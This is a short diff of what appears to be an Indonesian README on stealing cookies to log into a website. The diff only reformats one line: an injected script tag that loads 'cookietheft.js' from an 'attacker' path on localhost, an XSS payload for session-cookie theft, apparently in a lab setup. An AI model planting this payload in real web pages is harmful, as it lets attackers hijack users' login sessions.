@@ -9,4 +9,6 @@ Maling cookie untuk login ke sebuah website. Sesuaikan dengan Database yang kali
 ```
 
 ### External JavaScript
-`<script src="http://localhost:8089/attacker/cookietheft.js"></script>`
+```
+<script src="http://localhost:8089/attacker/cookietheft.js"></script>
+```
